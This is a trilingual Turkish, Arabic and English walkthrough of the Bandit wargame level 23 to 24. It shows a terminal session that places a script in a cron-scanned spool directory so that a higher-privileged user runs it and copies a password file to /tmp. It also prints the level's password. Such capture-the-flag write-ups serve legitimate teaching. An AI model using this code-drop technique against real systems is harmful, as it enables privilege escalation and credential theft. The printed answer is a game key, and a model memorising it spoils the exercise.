

---

### **Bandit Seviye 23 -> 24 (İlk Betiğini Yaz ve Sisteme Sız)**

Bu seviye, Bandit oyununda bir dönüm noktasıdır. Artık sadece başkalarının kodlarını analiz etmiyoruz; sistemi ele geçirmek için **kendi kodumuzu yazıyoruz**. Bu, bir güvenlik öğrencisi için analizcilikten programcılığa geçişi simgeleyen çok önemli bir adımdır.

#### **Bölüm 1: Olay Mahalli Analizi (Hedefi Anlamak)**

![[Bandit 23 Challenge.png]]

"Bu seviye, ilk kabuk betiğinizi oluşturmanızı gerektirir. Bu çok büyük bir adımdır ve bu seviyeyi geçtiğinizde kendinizle gurur duymalısınız! NOT: Betiğiniz yürütüldükten sonra silinir, bu yüzden bir kopyasını saklamak isteyebilirsiniz..."

**Hedefin Zihinsel Analizi:**

1.  **Görev Değişikliği:** Meydan okuma, bize açıkça "ilk kabuk betiğinizi oluşturun" diyor. Rolümüz değişti.
2.  **Temel Mekanizma:** Başlangıç noktası hala aynı: `/etc/cron.d/` dizininde bir `cron` işi var.
3.  **Zafiyetin Doğası:** Önceki seviyelerin aksine, zafiyet muhtemelen bizim değiştiremeyeceğimiz bir betikte değil, o betiğin **etkileşimde bulunduğu** bir yerde olmalıdır. Büyük olasılıkla, `cron` işi, bizim yazma iznimiz olan bir dizindeki dosyaları kontrol ediyordur.
4.  **"Kullan ve At" Mekanizması:** "Betiğiniz yürütüldükten sonra silinir" notu çok önemlidir. Bu, saldırımızın kalıcı olamayacağını, tek seferlik bir "vur ve kaç" operasyonu olması gerektiğini gösterir.

**İlk Plan (Dedektif ve Programcı Planı):**

1.  **Giriş ve Keşif:** `bandit23` olarak giriş yap ve `cronjob_bandit24` dosyasını oku. Bu, ana betiğin yolunu ortaya çıkaracaktır.
2.  **Ana Betiği Analiz Et:** Ana betiğin (`/usr/bin/cronjob_bandit24.sh`) içeriğini oku. Betiğin hangi dizini kontrol ettiğini ve dosyalarla ne yaptığını anla. Özellikle, hangi koşullar altında bir dosyayı **yürüttüğünü** bul.
3.  **Saldırı Betiğini (Payload) Hazırla:**
    *   Yazma iznimiz olan geçici bir dizinde (`/tmp/dizin_adi`) kendi betiğimizi oluştur.
    *   Bu betiğin tek bir amacı olmalı: `bandit24` şifresini okuyup, bizim daha sonra erişebileceğimiz başka bir dosyaya yazmak.
    *   Betiği `chmod +x` ile yürütülebilir yap.
4.  **Tuzağı Kur:** Kendi yazdığımız betiği, ana betiğin her dakika kontrol ettiği dizine kopyala.
5.  **Bekle ve Ganimeti Topla:** Bir dakika kadar bekle. Bu sürede, `cron` işi ana betiği çalıştıracak, ana betik bizim betiğimizi bulacak, koşullar sağlandığı için onu `bandit24` olarak yürütecek ve bizim betiğimiz de şifreyi bizim için bir dosyaya yazacak. Son olarak, şifrenin yazıldığı dosyayı oku.

#### **Bölüm 2: Soruşturma Araçları (Komutların Açıklaması)**

| Araç | Türkçe Açıklama | Ne Zaman Kullanmayı Düşünmeliyiz? |
| :--- | :--- | :--- |
| **`cat`** | **Dosya İçeriğini Görüntüleme** | `cron` yapılandırmasını ve ana betiğin içeriğini okumak için kritik öneme sahiptir. |
| **`ls -l`** | **Detaylı Listeleme** | Ana betiğin ve etkileşimde bulunduğu dizinlerin izinlerini kontrol etmek için kullanılır. |
| **`mkdir`** | **Dizin Oluşturma (Make Directory)** | Saldırı betiğimizi düzenli bir şekilde hazırlamak için geçici bir çalışma dizini oluşturur. |
| **`echo`** | **Metin Yazdırma** | Saldırı betiğimizin içeriğini hızlıca bir dosyaya yazmak için kullanılır. |
| **`chmod`** | **İzinleri Değiştirme (Change Mode)** | Kendi yazdığımız betiği yürütülebilir yapmak için kullanılır (`+x` bayrağı ile). |
| **`cp`** | **Kopyalama (Copy)** | Hazırladığımız saldırı betiğini, `cron` işinin hedef aldığı dizine yerleştirmek için kullanılır. |
| **`stat`** | **Dosya Durumunu Gösterme** | Ana betik, bir dosyanın sahibini kontrol etmek için bu komutu kullanır. Bu, zafiyetin anahtarıdır. |

#### **Bölüm 3: Soruşturma ve Sızma Yolculuğu (Gerçek Terminal Kaydı)**

İşte tam olarak yaşandığı gibi, adım adım tüm hikaye.

##### **Aşama 1: Ana Betiğin Analizi**

`bandit23` olarak giriş yaptıktan sonra, `cron` işini ve ardından ana betiği inceleriz.

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami) # cron çalıştırdığında bu "bandit24" olur
cd /var/spool/$myname/foo # /var/spool/bandit24/foo dizinine gider
...
for i in * .*;
do
    ...
    owner="$(stat --format "%U" ./$i)" # Dosyanın sahibini alır
    if [ "${owner}" = "bandit23" ]; then # EĞER SAHİBİ "bandit23" İSE
        timeout -s 9 60 ./$i # DOSYAYI YÜRÜT!
    fi
    rm -f ./$i # Sonra dosyayı sil
    ...
done
```

**Analiz:** Zafiyet çok açık: `/var/spool/bandit24/foo` dizinine, sahibi `bandit23` olan yürütülebilir bir dosya koyarsak, `bandit24` kullanıcısı bu dosyayı bizim için çalıştıracaktır.

##### **Aşama 2: Saldırı Betiğini (Payload) Hazırlama**

Geçici bir dizinde kendi betiğimizi oluştururuz.

```bash
bandit23@bandit:~$ mkdir /tmp/myattack
bandit23@bandit:~$ cd /tmp/myattack

# Betiğin içeriğini oluştur: bandit24 şifresini oku ve /tmp/mypassword.txt'ye yaz
bandit23@bandit:/tmp/myattack$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/mypassword.txt' > my_script.sh

# Betiği yürütülebilir yap
bandit23@bandit:/tmp/myattack$ chmod +x my_script.sh
```

**Analiz:** Artık `my_script.sh` adında, `bandit24` olarak çalıştığında şifreyi bizim için çalacak bir betiğimiz var.

##### **Aşama 3: Tuzağı Kurma ve Ganimeti Toplama**

Betiğimizi hedef dizine kopyalarız ve bir dakika bekledikten sonra sonucu kontrol ederiz.

```bash
# Betiği hedef dizine kopyala
bandit23@bandit:/tmp/myattack$ cp my_script.sh /var/spool/bandit24/foo/

# (Bir dakika kadar bekle...)

# Sonucu oku
bandit23@bandit:/tmp/myattack$ cat /tmp/mypassword.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

**Nihai Karar:** `cron` tarafından tetiklenen bir betikteki zayıf bir koşulu (dosya sahibini kontrol etme) istismar ederek, kendi hazırladığımız bir kodu daha yüksek yetkili bir kullanıcıya (`bandit24`) çalıştırttık ve bu sayede bir sonraki seviyenin şifresini ele geçirdik.

**`bandit24` seviyesinin şifresi: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`**

---
---

### **دليل Bandit التعليمي: المستوى 23 -> 24 (اكتب أول برنامج نصي لك واخترق النظام)**

هذا المستوى يمثل نقطة تحول في لعبة Bandit. لم نعد نحلل أكواد الآخرين فقط؛ بل أصبحنا **نكتب كودنا الخاص** لاختراق النظام. هذه خطوة مهمة جدًا ترمز إلى الانتقال من محلل إلى مبرمج في رحلة تعلم الأمن السيبراني.

#### **الجزء الأول: تحليل مسرح الجريمة (فهم الهدف)**

![[Bandit 23 Challenge.png]] "هذا المستوى يتطلب منك إنشاء أول برنامج نصي خاص بك. هذه خطوة كبيرة جدًا ويجب أن تكون فخورًا بنفسك عندما تتغلب على هذا المستوى! ملاحظة: يتم حذف برنامجك النصي بمجرد تنفيذه، لذا قد ترغب في الاحتفاظ بنسخة..."

**التحليل الذهني للهدف:**

1.  **تغير المهمة:** التحدي يخبرنا صراحة "أنشئ أول برنامج نصي خاص بك". لقد تغير دورنا.
2.  **الآلية الأساسية:** نقطة البداية لا تزال كما هي: مهمة `cron` في `/etc/cron.d/`.
3.  **طبيعة الثغرة:** على عكس المستويات السابقة، من غير المرجح أن تكون الثغرة في برنامج نصي لا يمكننا تعديله، بل في شيء **يتفاعل معه** هذا البرنامج. على الأغلب، تقوم مهمة `cron` بفحص مجلد لدينا صلاحية الكتابة فيه.
4.  **آلية "استخدم وارمِ":** ملاحظة "يتم حذف برنامجك النصي بعد تنفيذه" مهمة جدًا. هذا يعني أن هجومنا لا يمكن أن يكون دائمًا، بل يجب أن يكون عملية "اضرب واهرب" لمرة واحدة.

**الخطة المبدئية (خطة المحقق والمبرمج):**

1.  **الدخول والاستكشاف:** سجل الدخول باسم `bandit23` واقرأ ملف `cronjob_bandit24`. هذا سيكشف عن مسار البرنامج النصي الرئيسي.
2.  **تحليل البرنامج النصي الرئيسي:** اقرأ محتوى البرنامج النصي الرئيسي (`/usr/bin/cronjob_bandit24.sh`). افهم أي مجلد يقوم بفحصه وماذا يفعل بالملفات. على وجه الخصوص، اكتشف تحت أي ظرف يقوم **بتنفيذ** ملف ما.
3.  **إعداد الحمولة الخبيثة (Payload):**
    *   أنشئ برنامجنا النصي الخاص في مجلد مؤقت لدينا صلاحية الكتابة فيه (`/tmp/your_dir`).
    *   يجب أن يكون لهذا البرنامج هدف واحد: قراءة كلمة سر `bandit24` وكتابتها في ملف آخر يمكننا الوصول إليه لاحقًا.
    *   اجعل البرنامج النصي قابلاً للتنفيذ باستخدام `chmod +x`.
4.  **نصب الفخ:** انسخ برنامجنا النصي الذي أنشأناه إلى المجلد الذي تقوم المهمة الرئيسية بفحصه كل دقيقة.
5.  **الانتظار وجمع الغنائم:** انتظر لمدة دقيقة. خلال هذا الوقت، ستقوم مهمة `cron` بتشغيل البرنامج النصي الرئيسي، والذي سيجد برنامجنا، وبما أن الشروط متحققة، سيقوم بتنفيذه بصلاحيات `bandit24`. سيقوم برنامجنا بدوره بكتابة كلمة السر في ملف لنا. أخيرًا، اقرأ الملف الذي يحتوي على كلمة السر.

#### **الجزء الثاني: أدوات التحقيق (شرح الأوامر)**

| الأداة | الشرح بالعربية | متى نفكر في استخدامها؟ |
| :--- | :--- | :--- |
| **`cat`** | **عرض محتوى الملفات** | أداة حاسمة لقراءة إعدادات `cron` ومحتوى البرنامج النصي الرئيسي. |
| **`ls -l`** | **عرض القائمة المفصل** | تُستخدم لفحص صلاحيات البرنامج النصي الرئيسي والمجلدات التي يتفاعل معها. |
| **`mkdir`** | **إنشاء مجلد (Make Directory)** | لإنشاء مجلد عمل مؤقت لتنظيم وإعداد حمولتنا الخبيثة. |
| **`echo`** | **طباعة نص** | تُستخدم لكتابة محتوى برنامجنا النصي بسرعة في ملف. |
| **`chmod`** | **تغيير الصلاحيات (Change Mode)** | لجعل برنامجنا النصي قابلاً للتنفيذ (باستخدام العلامة `+x`). |
| **`cp`** | **نسخ (Copy)** | لوضع برنامجنا النصي المُعد في المجلد المستهدف الذي تفحصه مهمة `cron`. |
| **`stat`** | **عرض حالة الملف** | يستخدمها البرنامج النصي الرئيسي للتحقق من مالك الملف. هذا هو مفتاح الثغرة. |

#### **الجزء الثالث: رحلة التحقيق والاختراق (سجل الطرفية الحقيقي)**

هذه هي القصة الكاملة، خطوة بخطوة، كما حدثت بالضبط.

##### **المرحلة 1: تحليل البرنامج النصي الرئيسي**

بعد الدخول باسم `bandit23`، نفحص مهمة `cron` ثم البرنامج النصي الرئيسي.

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami) # عندما يشغله cron، تكون القيمة "bandit24"
cd /var/spool/$myname/foo # يذهب إلى المجلد /var/spool/bandit24/foo
...
for i in * .*;
do
    ...
    owner="$(stat --format "%U" ./$i)" # يحصل على مالك الملف
    if [ "${owner}" = "bandit23" ]; then # إذا كان المالك هو "bandit23"
        timeout -s 9 60 ./$i # قم بتنفيذ الملف!
    fi
    rm -f ./$i # ثم احذف الملف
    ...
done
```

**التحليل:** الثغرة واضحة جدًا: إذا وضعنا ملفًا قابلاً للتنفيذ في المجلد `/var/spool/bandit24/foo` ويكون مالكه هو `bandit23`، فإن المستخدم `bandit24` سيقوم بتشغيل هذا الملف لنا.

##### **المرحلة 2: إعداد الحمولة الخبيثة (Payload)**

ننشئ برنامجنا النصي في مجلد مؤقت.

```bash
bandit23@bandit:~$ mkdir /tmp/myattack
bandit23@bandit:~$ cd /tmp/myattack

# أنشئ محتوى البرنامج النصي: اقرأ كلمة سر bandit24 واكتبها في /tmp/mypassword.txt
bandit23@bandit:/tmp/myattack$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/mypassword.txt' > my_script.sh

# اجعل البرنامج النصي قابلاً للتنفيذ
bandit23@bandit:/tmp/myattack$ chmod +x my_script.sh
```

**التحليل:** لدينا الآن برنامج نصي اسمه `my_script.sh`، والذي سيقوم بسرقة كلمة السر لنا عندما يتم تشغيله بصلاحيات `bandit24`.

##### **المرحلة 3: نصب الفخ وجمع الغنائم**

ننسخ برنامجنا النصي إلى المجلد المستهدف، ننتظر دقيقة، ثم نتحقق من النتيجة.

```bash
# انسخ البرنامج النصي إلى المجلد المستهدف
bandit23@bandit:/tmp/myattack$ cp my_script.sh /var/spool/bandit24/foo/

# (انتظر لمدة دقيقة تقريبًا...)

# اقرأ النتيجة
bandit23@bandit:/tmp/myattack$ cat /tmp/mypassword.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

**الحكم النهائي:** من خلال استغلال شرط ضعيف (التحقق من مالك الملف) في برنامج نصي يتم تشغيله بواسطة `cron`، نجحنا في جعل مستخدم بصلاحيات أعلى (`bandit24`) يقوم بتشغيل كود من إعدادنا، وبالتالي تمكنا من سرقة كلمة السر للمستوى التالي.

**كلمة السر للمستوى `bandit24` هي: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`**

---

## 🇺🇸 English

### Objective
Write a custom script that gets executed by a cron job running as `bandit24`.

### Process
1. Create a script that copies the password to a readable location
2. Place script in `/var/spool/bandit24/foo/`
3. Wait for cron to execute it
4. Read the output file

### Script Example
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mypassword.txt
chmod 644 /tmp/mypassword.txt
```

### Key Takeaways
- **Code Injection:** Make higher-privileged users run your code
- **Permissions:** Ensure output files are readable
- **Cron Exploitation:** Monitor `/var/spool/` for writable directories